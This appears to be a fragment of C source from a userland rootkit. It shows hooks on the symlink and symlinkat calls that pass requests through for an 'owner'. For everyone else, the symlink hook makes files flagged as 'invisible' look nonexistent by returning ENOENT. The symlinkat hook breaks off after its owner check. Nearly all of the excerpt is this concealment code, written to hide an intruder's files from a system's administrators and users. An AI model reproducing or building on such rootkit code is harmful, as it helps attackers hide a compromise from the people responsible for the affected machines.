...
{
    DEBUG("symlink hooked.\n");

    if(is_owner())
    {
        return (long)syscall_list[SYS_SYMLINK].syscall_func(target, linkpath);
    }

    if(is_invisible(target) || is_invisible(linkpath))
    {
        errno = ENOENT;
        return -1;
    }
...
{
    DEBUG("symlinkat hooked.\n");

    if(is_owner())
    {
        return (long)syscall_list[SYS_SYMLINKAT].syscall_func(target, newdirfd, linkpath);
    }
